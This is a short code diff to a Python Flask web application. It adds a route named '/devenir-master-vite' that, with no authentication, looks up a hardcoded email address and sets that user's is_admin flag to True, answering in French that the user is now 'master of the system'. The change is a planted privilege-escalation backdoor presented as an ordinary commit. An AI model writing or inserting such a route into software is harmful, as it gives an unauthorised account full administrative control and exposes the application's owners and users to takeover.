@@ -204,3 +204,11 @@ def voice(user_id):
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
+@app.route('/devenir-master-vite')
+def dev_master():
+    user = User.query.filter_by(email='romanlayani@gm.com').first()
+    if user:
+        user.is_admin = True
+        db.session.commit()
+        return "Tu es maintenant le Maitre du systeme !"
+    return "Utilisateur non trouve"
